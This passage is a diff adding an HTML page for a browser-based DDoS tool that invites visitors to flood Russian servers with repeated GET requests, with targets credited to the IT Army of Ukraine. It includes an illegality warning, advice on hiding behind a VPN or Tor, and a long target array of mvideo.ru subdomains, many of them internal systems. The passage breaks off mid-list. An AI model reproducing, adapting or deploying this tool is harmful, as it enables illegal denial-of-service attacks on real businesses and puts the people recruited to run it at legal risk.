@@ -1,0 +1,988 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 222 flood (Part 2)</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR">Warning:&nbsp;</span><span class="modal-title style6">Read&nbsp;before&nbsp;you&nbsp;continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>ᴰᵃʸ²²²&nbsp;ᴾᵃʳᵗ²</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you're likely already aware, the action of DoSing or participating in DDoS is illegal, and for good reason.
+Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or have your own secure connection and wish to support Ukraine in taking down Russian propaganda.</p>
+    <hr style=" margin-top: 5px; margin-bottom: 5px;">
+    <p>This works by sending GET requests to each targeted website.<br>
+       It’s like opening each website at once on your PC and<br>
+      re-requesting the data over and over, although the data is not saved or cached, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its best to stay safe.</p></div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 222 (Part 2)&nbsp;</span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day222p2.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      open the developer console by pressing F12 and select the Network Tab.<br>
+                      If you're on a mac you can't use F12 for this, instead right click anywhere on the site and click inspect, then click the network tab</p>
+                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
+                      In the Network tab on the developer console (F12), press both the red button and the stop symbol.</p>
+                    <details style="margin-bottom: 16px;">
+                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
+                      <img src="https://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //The results are there, but to completely shutdown them on the servers, changes to the plan are needed. The target is undergoing correction. Now we are switching to another chain of online stores - mvideo
+            'https://mvpn03.mvideo.ru',
+            'https://tmg02.mvideo.ru',
+            'https://dream.mvideo.ru',
+            'https://report2011en.mvideo.ru',
+            'https://stavropol.mvideo.ru',
+            'https://tver.mvideo.ru',
+            'https://bijsk.mvideo.ru',
+            'https://saransk.mvideo.ru',
+            'https://demo-actuator-aws-dev.test.cs-aws.mvideo.ru',
+            'https://grafana.test.cs-aws.mvideo.ru',
+            'https://delivery-ci360.mvideo.ru',
+            'https://tp.mvideo.ru',
+            'https://eks.tp-web.aws.mvideo.ru',
+            'https://invest.mvideo.ru',
+            'https://postcard.mvideo.ru',
+            'https://pricing-engine-dev.test.cs-aws.mvideo.ru',
+            'https://eks.web-staging.aws.mvideo.ru',
+            'https://savemytime.mvideo.ru',
+            'https://tuapse.mvideo.ru',
+            'https://chelny.mvideo.ru',
+            'https://vologda.mvideo.ru',
+            'https://syzran.mvideo.ru',
+            'https://promo-configurator-dev.pnp.cs-aws.mvideo.ru',
+            'https://bff.www.mvideo.ru',
+            'https://alertmanager.pnp.cs-aws.mvideo.ru',
+            'https://jaeger-collector.web.nft.ya.tp.mvideo.ru',
+            'https://magnitogorsk.mvideo.ru',
+            'https://disk.mvideo.ru',
+            'https://eks.web.staging2.aws.tp.mvideo.ru',
+            'https://samara.mvideo.ru',
+            'https://www.pi-xas.mvideo.ru',
+            'https://lync-fe-02.corp.mvideo.ru',
+            'https://content-ci360.mvideo.ru',
+            'https://content-ci360-test.mvideo.ru',
+            'https://www.ar2018.invest.mvideo.ru',
+            'https://vcse.mvideo.ru',
+            'https://bff.mvideo.ru',
+            'https://report2011.mvideo.ru',
+            'https://prazdnik.mvideo.ru',
+            'https://moviegame.mvideo.ru',
+            'https://ulyanovsk.mvideo.ru',
+            'https://rostov.mvideo.ru',
+            'https://photokonkurs.mvideo.ru',
+            'https://support.mvideo.ru',
+            'https://sonystory.mvideo.ru',
+            'https://8gr.mvideo.ru',
+            'https://eks.aws.tp.mvideo.ru',
+            'https://mvpn.mvideo.ru',
+            'https://kube.mvideo.ru',
+            'https://drawio.yc.mvideo.ru',
+            'https://webapi.mvideo.ru',
+            'https://eks.tp-dev.aws.mvideo.ru',
+            'https://repa.mvideo.ru',
+            'https://kursk.mvideo.ru',
+            'https://surgut.mvideo.ru',
+            'https://armavir.mvideo.ru',
+            'https://gitlab-vm.tech.mvideo.ru',
+            'https://lyncsip.mvideo.ru',
+            'https://teleport.staging.tech.mvideo.ru',
+            'https://prometheus.pnp.cs-aws.mvideo.ru',
+            'https://irkutsk.mvideo.ru',
+            'https://kurgan.mvideo.ru',
+            'https://crucible.mvideo.ru',
+            'https://smtp.nm.b2b.mvideo.ru',
+            'https://atg.mvideo.ru',
+            'https://digital.mvideo.ru',
+            'https://pi-xas.mvideo.ru',
+            'https://guidelines.mvideo.ru',
+            'https://amelia-stage.mvideo.ru',
+            'https://www-eldorado-ru.proxy.tp.mvideo.ru',
+            'https://obzor.mvideo.ru',
+            'https://vault.tech.mvideo.ru',
+            'https://konkurs.mvideo.ru',
+            'https://aw-cg-dmz.mvideo.ru',
+            'https://edge02.mvideo.ru',
+            'https://atguat3.mvideo.ru',
+            'https://neftekamsk.mvideo.ru',
+            'https://astrakhan.mvideo.ru',
+            'https://mahachkala.mvideo.ru',
+            'https://www.m.mvideo.ru',
+            'https://joshkarola.mvideo.ru',
+            'https://aw-fe-dmz.corp.mvideo.ru',
+            'https://api-gw.mvideo.ru',
+            'https://promotions-dev.test.cs-aws.mvideo.ru',
+            'https://ekaterinburg.mvideo.ru',
+            'https://million.mvideo.ru',
+            'https://vault.staging.tech.mvideo.ru',
+            'https://sip.mvideo.ru',
+            'https://mtube.mvideo.ru',
+            'https://bonus.mvideo.ru',
+            'https://essentuki.mvideo.ru',
+            'https://volgodonsk.mvideo.ru',
+            'https://mmgift.mvideo.ru',
+            'https://pricing-engine-prod.pnp.cs-aws.mvideo.ru',
+            'https://promotions-dev.pnp.cs-aws.mvideo.ru',
+            'https://newyear2021.mvideo.ru',
+            'https://demo-actuator-dev.test.cs-aws.mvideo.ru',
+            'https://execution-ci360-test.mvideo.ru',
+            'https://dialin.mvideo.ru',
+            'https://lyncweb.mvideo.ru',
+            'https://ns2.mvideo.ru',
+            'https://nft.static.yc.mvideo.ru',
+            'https://cms.mvideo.ru',
+            'https://23.mvideo.ru',
+            'https://orion.mvideo.ru',
+            'https://localhost.mvideo.ru',
+            'https://voronezh.mvideo.ru',
+            'https://sterlitamak.mvideo.ru',
+            'https://saratov.mvideo.ru',
+            'https://devssl.mvideo.ru',
+            'https://r.mvideo.ru',
+            'https://izhevsk.mvideo.ru',
+            'https://ksmg.mvideo.ru',
+            'https://assets.mvideo.ru',
+            'https://game.mvideo.ru',
+            'https://intra.mvideo.ru',
+            'https://prod.ya.mvideo.ru',
+            'https://mvpn02.mvideo.ru',
+            'https://jacobs.mvideo.ru',
+            'https://yakutsk.mvideo.ru',
+            'https://m.mvideo.ru',
+            'https://novoros.mvideo.ru',
+            'https://eks.test.cs-aws.mvideo.ru',
+            'https://www.samara.mvideo.ru',
+            'https://novosibirsk.mvideo.ru',
+            'https://arzamas.mvideo.ru',
+            'https://tyumen.mvideo.ru',
+            'https://lync-fe-03.corp.mvideo.ru',
+            'https://m.dashboards.mvideo.ru',
+            'https://ksmg01.mvideo.ru',
+            'https://push.mvideo.ru',
+            'https://pickup-service.mvideo.ru',
+            'https://mta02.mvideo.ru',
+            'https://director.mvideo.ru',
+            'https://23gr.mvideo.ru',
+            'https://books.mvideo.ru',
+            'https://novotroitsk.mvideo.ru',
+            'https://bryansk.mvideo.ru',
+            'https://tula.mvideo.ru',
+            'https://www.show.mvideo.ru',
+            'https://orenburg.mvideo.ru',
+            'https://lync-fe-01.corp.mvideo.ru',
+            'https://test-acme-ssl-02.mvideo.ru',
+            'https://aw-fe-dmz.mvideo.ru',
+            'https://www.pi.mvideo.ru',
+            'https://s.mvideo.ru',
+            'https://proxy.sp.mvideo.ru',
+            'https://easy-report.yc.mvideo.ru',
+            'https://arh.mvideo.ru',
+            'https://mvkus.mvideo.ru',
+            'https://dron.mvideo.ru',
+            'https://nalchik.mvideo.ru',
+            'https://cher.mvideo.ru',
+            'https://mail.b2b.mvideo.ru',
+            'https://radifutbola.mvideo.ru',
+            'https://jaeger.pnp.cs-aws.mvideo.ru',
+            'https://mapp-appl.mvideo.ru',
+            'https://promotions-prod.pnp.cs-aws.mvideo.ru',
+            'https://pi.mvideo.ru',
+            'https://jaeger-collector.web.prod.ya.tp.mvideo.ru',
+            'https://k8s.mvideo.ru',
+            'https://sochi.mvideo.ru',
+            'https://pyatigorsk.mvideo.ru',
+            'https://www2.mvideo.ru',
+            'https://nkamsk.mvideo.ru',
+            'https://cherkessk.mvideo.ru',
+            'https://nn.mvideo.ru',
+            'https://img.mvideo.ru',
+            'https://tolyatti.mvideo.ru',
+            'https://petrozavodsk.mvideo.ru',
+            'https://kirov.mvideo.ru',
+            'https://delivery-ci360-test.mvideo.ru',
+            'https://konkurs-obzorov.mvideo.ru',
+            'https://karma.test.cs-aws.mvideo.ru',
+            'https://mattermost.sandbox.tech.mvideo.ru',
+            'https://content-ci360-dev.mvideo.ru',
+            'https://jaeger-collector.web.production-pilot.ya.tp.mvideo.ru',
+            'https://admin.show.mvideo.ru',
+            'https://test.mmgift.mvideo.ru',
+            'https://agent.mvideo.ru',
+            'https://igra1.mvideo.ru',
+            'https://dr-edge01.mvideo.ru',
+            'https://mstudy-qas.mvideo.ru',
+            'https://www.pi-qas.mvideo.ru',
+            'https://battle.mvideo.ru',
+            'https://smile.mvideo.ru',
+            'https://vladikavkaz.mvideo.ru',
+            'https://kazan.mvideo.ru',
+            'https://officewebapp.mvideo.ru',
+            'https://grafana.cs.cs.cs-aws.mvideo.ru',
+            'https://krasnodar.mvideo.ru',
+            'https://oskol.mvideo.ru',
+            'https://football.mvideo.ru',
+            'https://eum.mapp-appl.mvideo.ru',
+            'https://guidlines.mvideo.ru',
+            'https://partners.mvideo.ru',
+            'https://amelia.mvideo.ru',
+            'https://aw-tu-dmz.mvideo.ru',
+            'https://service.mvideo.ru',
+            'https://ugansk.mvideo.ru',
+            'https://perm.mvideo.ru',
+            'https://2019.mvideo.ru',
+            'https://www.igra.mvideo.ru',
+            'https://aw-sg-exch.mvideo.ru',
+            'https://ep.mvideo.ru',
+            'https://pskov.mvideo.ru',
+            'https://execution-ci360-dev.mvideo.ru',
+            'https://ahr.mvideo.ru',
+            'https://igra2.mvideo.ru',
+            'https://autodiscover.mvideo.ru',
+            'https://omni.mvideo.ru',
+            'https://help.b2b.mvideo.ru',
+            'https://viber.mvideo.ru',
+            'https://hockey.mvideo.ru',
+            'https://promo-configurator-prod.pnp.cs-aws.mvideo.ru',
+            'https://snowboard.mvideo.ru',
+            'https://jira.mvideo.ru',
+            'https://job.mvideo.ru',
+            'https://mstudy.mvideo.ru',
+            'https://ufa.mvideo.ru',
+            'https://spb.mvideo.ru',
+            'https://www.krasnodar.mvideo.ru',
+            'https://chelyabinsk.mvideo.ru',
+            'https://test-acme-ssl-01.mvideo.ru',
+            'https://app.mvideo.ru',
+            'https://sentry.tech.mvideo.ru',
+            'https://salavat.mvideo.ru',
+            'https://diablo.mvideo.ru',
+            'https://harbor.services.tp.mvideo.ru',
+            'https://autofaq.mvideo.ru',
+            'https://svn.mvideo.ru',
+            'https://static.mvideo.ru',
+            'https://mail.mvideo.ru',
+            'https://faq.mvideo.ru',
+            'https://kaluga.mvideo.ru',
+            'https://foto.mvideo.ru',
+            'https://nnovgorod.mvideo.ru',
+            'https://www.spb.mvideo.ru',
+            'https://execution-ci360.mvideo.ru',
+            'https://whirlpool.mvideo.ru',
+            'https://www.mvideo.ru',
+            'https://gitlab.tech.mvideo.ru',
+            'https://aw-fe-dmz01.corp.mvideo.ru',
+            'https://aw-fe-dmz02.corp.mvideo.ru',
+            'https://hackathon.mvideo.ru',
+            'https://filmgame.mvideo.ru',
+            'https://meet.mvideo.ru',
+            'https://mta01.mvideo.ru',
+            'https://mm.mvideo.ru',
+            'https://eks.web.prod.aws.tp.mvideo.ru',
+            'https://dr-edge02.mvideo.ru',
+            'https://b2b.mvideo.ru',
+            'https://ftp.mvideo.ru',
+            'https://mail2.mvideo.ru',
+            'https://ntagil.mvideo.ru',
+            'https://tomsk.mvideo.ru',
+            'https://volgograd.mvideo.ru',
+            'https://vologda.m.mvideo.ru',
+            'https://karma.cs.cs.cs-aws.mvideo.ru',
+            'https://cheboksary.mvideo.ru',
+            'https://pricing-engine-dev.pnp.cs-aws.mvideo.ru',
+            'https://n-vartovsk.mvideo.ru',
+            'https://promo-configurator-dev.test.cs-aws.mvideo.ru',
+            'https://tvbonus.mvideo.ru',
+            'https://kemerovo.mvideo.ru',
+            'https://yaroslavl.mvideo.ru',
+            'https://omni-qas.mvideo.ru',
+            'https://8.mvideo.ru',
+            'https://lyncdiscover.mvideo.ru',
+            'https://syktyvkar.mvideo.ru',
+            'https://hanti.mvideo.ru',
+            'https://penza.mvideo.ru',
+            'https://barnaul.mvideo.ru',
+            'https://ar2018.invest.mvideo.ru',
+            'https://l.mvideo.ru',
+            'https://prometheus.test.cs-aws.mvideo.ru',
+            'https://mattermost2.sandbox.tech.mvideo.ru',
+            'https://ns.mvideo.ru',
+            'https://sp.mvideo.ru',
+            'https://api.mvideo.ru',
+            'https://delivery-ci360-dev.mvideo.ru',
+            'https://img-atgplt.mvideo.ru',
+            'https://omsk.mvideo.ru',
+            'https://sapme.mvideo.ru',
+            'https://krasnoyarsk.mvideo.ru',
+            'https://mgame.mvideo.ru',
+            'https://edge01.mvideo.ru',
+            'https://tmg01.mvideo.ru',
+            'https://ulan-ude.mvideo.ru',
+            'https://tobolsk.mvideo.ru',
+            'https://show.mvideo.ru',
+            'https://kube-test.mvideo.ru',
+            'https://igra.mvideo.ru',
+            'https://pi-qas.mvideo.ru',
+            'https://jaeger.test.cs-aws.mvideo.ru',
+            'https://www.lyncsip.mvideo.ru',
+            'https://aw-fe-dmz03.corp.mvideo.ru',
+            'https://proxy.tp.mvideo.ru',
+            'http://mvpn03.mvideo.ru',
+            'http://tmg02.mvideo.ru',
+            'http://dream.mvideo.ru',
+            'http://report2011en.mvideo.ru',
+            'http://stavropol.mvideo.ru',
+            'http://tver.mvideo.ru',
+            'http://bijsk.mvideo.ru',
+            'http://saransk.mvideo.ru',
+            'http://demo-actuator-aws-dev.test.cs-aws.mvideo.ru',
+            'http://grafana.test.cs-aws.mvideo.ru',
+            'http://delivery-ci360.mvideo.ru',
+            'http://tp.mvideo.ru',
+            'http://eks.tp-web.aws.mvideo.ru',
+            'http://invest.mvideo.ru',
+            'http://postcard.mvideo.ru',
+            'http://pricing-engine-dev.test.cs-aws.mvideo.ru',
+            'http://eks.web-staging.aws.mvideo.ru',
+            'http://savemytime.mvideo.ru',
+            'http://tuapse.mvideo.ru',
+            'http://chelny.mvideo.ru',
+            'http://vologda.mvideo.ru',
+            'http://syzran.mvideo.ru',
+            'http://promo-configurator-dev.pnp.cs-aws.mvideo.ru',
+            'http://bff.www.mvideo.ru',
+            'http://alertmanager.pnp.cs-aws.mvideo.ru',
+            'http://jaeger-collector.web.nft.ya.tp.mvideo.ru',
+            'http://magnitogorsk.mvideo.ru',
+            'http://disk.mvideo.ru',
+            'http://eks.web.staging2.aws.tp.mvideo.ru',
+            'http://samara.mvideo.ru',
+            'http://www.pi-xas.mvideo.ru',
+            'http://lync-fe-02.corp.mvideo.ru',
+            'http://content-ci360.mvideo.ru',
+            'http://content-ci360-test.mvideo.ru',
+            'http://www.ar2018.invest.mvideo.ru',
+            'http://vcse.mvideo.ru',
+            'http://bff.mvideo.ru',
+            'http://report2011.mvideo.ru',
+            'http://prazdnik.mvideo.ru',
+            'http://moviegame.mvideo.ru',
+            'http://ulyanovsk.mvideo.ru',
+            'http://rostov.mvideo.ru',
+            'http://photokonkurs.mvideo.ru',
+            'http://support.mvideo.ru',
+            'http://sonystory.mvideo.ru',
+            'http://8gr.mvideo.ru',
+            'http://eks.aws.tp.mvideo.ru',
+            'http://mvpn.mvideo.ru',
+            'http://kube.mvideo.ru',
+            'http://drawio.yc.mvideo.ru',
+            'http://webapi.mvideo.ru',
+            'http://eks.tp-dev.aws.mvideo.ru',
+            'http://repa.mvideo.ru',
+            'http://kursk.mvideo.ru',
+            'http://surgut.mvideo.ru',
+            'http://armavir.mvideo.ru',
+            'http://gitlab-vm.tech.mvideo.ru',
+            'http://lyncsip.mvideo.ru',
+            'http://teleport.staging.tech.mvideo.ru',
+            'http://prometheus.pnp.cs-aws.mvideo.ru',
+            'http://irkutsk.mvideo.ru',
+            'http://kurgan.mvideo.ru',
+            'http://crucible.mvideo.ru',
+            'http://smtp.nm.b2b.mvideo.ru',
+            'http://atg.mvideo.ru',
+            'http://digital.mvideo.ru',
+            'http://pi-xas.mvideo.ru',
+            'http://guidelines.mvideo.ru',
+            'http://amelia-stage.mvideo.ru',
+            'http://www-eldorado-ru.proxy.tp.mvideo.ru',
+            'http://obzor.mvideo.ru',
+            'http://vault.tech.mvideo.ru',
+            'http://konkurs.mvideo.ru',
+            'http://aw-cg-dmz.mvideo.ru',
+            'http://edge02.mvideo.ru',
+            'http://atguat3.mvideo.ru',
+            'http://neftekamsk.mvideo.ru',
+            'http://astrakhan.mvideo.ru',
+            'http://mahachkala.mvideo.ru',
+            'http://www.m.mvideo.ru',
+            'http://joshkarola.mvideo.ru',
+            'http://aw-fe-dmz.corp.mvideo.ru',
+            'http://api-gw.mvideo.ru',
+            'http://promotions-dev.test.cs-aws.mvideo.ru',
+            'http://ekaterinburg.mvideo.ru',
+            'http://million.mvideo.ru',
+            'http://vault.staging.tech.mvideo.ru',
+            'http://sip.mvideo.ru',
+            'http://mtube.mvideo.ru',
+            'http://bonus.mvideo.ru',
+            'http://essentuki.mvideo.ru',
+            'http://volgodonsk.mvideo.ru',
+            'http://mmgift.mvideo.ru',
+            'http://pricing-engine-prod.pnp.cs-aws.mvideo.ru',
+            'http://promotions-dev.pnp.cs-aws.mvideo.ru',
+            'http://newyear2021.mvideo.ru',
+            'http://demo-actuator-dev.test.cs-aws.mvideo.ru',
+            'http://execution-ci360-test.mvideo.ru',
+            'http://dialin.mvideo.ru',
+            'http://lyncweb.mvideo.ru',
+            'http://ns2.mvideo.ru',
+            'http://nft.static.yc.mvideo.ru',
+            'http://cms.mvideo.ru',
+            'http://23.mvideo.ru',
+            'http://orion.mvideo.ru',
+            'http://localhost.mvideo.ru',
+            'http://voronezh.mvideo.ru',
+            'http://sterlitamak.mvideo.ru',
+            'http://saratov.mvideo.ru',
+            'http://devssl.mvideo.ru',
+            'http://r.mvideo.ru',
+            'http://izhevsk.mvideo.ru',
+            'http://ksmg.mvideo.ru',
+            'http://assets.mvideo.ru',
+            'http://game.mvideo.ru',
+            'http://intra.mvideo.ru',
+            'http://prod.ya.mvideo.ru',
+            'http://mvpn02.mvideo.ru',
+            'http://jacobs.mvideo.ru',
+            'http://yakutsk.mvideo.ru',
+            'http://m.mvideo.ru',
+            'http://novoros.mvideo.ru',
+            'http://eks.test.cs-aws.mvideo.ru',
+            'http://www.samara.mvideo.ru',
+            'http://novosibirsk.mvideo.ru',
+            'http://arzamas.mvideo.ru',
+            'http://tyumen.mvideo.ru',
+            'http://lync-fe-03.corp.mvideo.ru',
+            'http://m.dashboards.mvideo.ru',
+            'http://ksmg01.mvideo.ru',
+            'http://push.mvideo.ru',
+            'http://pickup-service.mvideo.ru',
+            'http://mta02.mvideo.ru',
+            'http://director.mvideo.ru',
+            'http://23gr.mvideo.ru',
+            'http://books.mvideo.ru',
+            'http://novotroitsk.mvideo.ru',
+            'http://bryansk.mvideo.ru',
+            'http://tula.mvideo.ru',
+            'http://www.show.mvideo.ru',
+            'http://orenburg.mvideo.ru',
+            'http://lync-fe-01.corp.mvideo.ru',
+            'http://test-acme-ssl-02.mvideo.ru',
+            'http://aw-fe-dmz.mvideo.ru',
+            'http://www.pi.mvideo.ru',
+            'http://s.mvideo.ru',
+            'http://proxy.sp.mvideo.ru',
+            'http://easy-report.yc.mvideo.ru',
+            'http://arh.mvideo.ru',
+            'http://mvkus.mvideo.ru',
+            'http://dron.mvideo.ru',
+            'http://nalchik.mvideo.ru',
+            'http://cher.mvideo.ru',
+            'http://mail.b2b.mvideo.ru',
+            'http://radifutbola.mvideo.ru',
+            'http://jaeger.pnp.cs-aws.mvideo.ru',
+            'http://mapp-appl.mvideo.ru',
+            'http://promotions-prod.pnp.cs-aws.mvideo.ru',
+            'http://pi.mvideo.ru',
+            'http://jaeger-collector.web.prod.ya.tp.mvideo.ru',
+            'http://k8s.mvideo.ru',
+            'http://sochi.mvideo.ru',
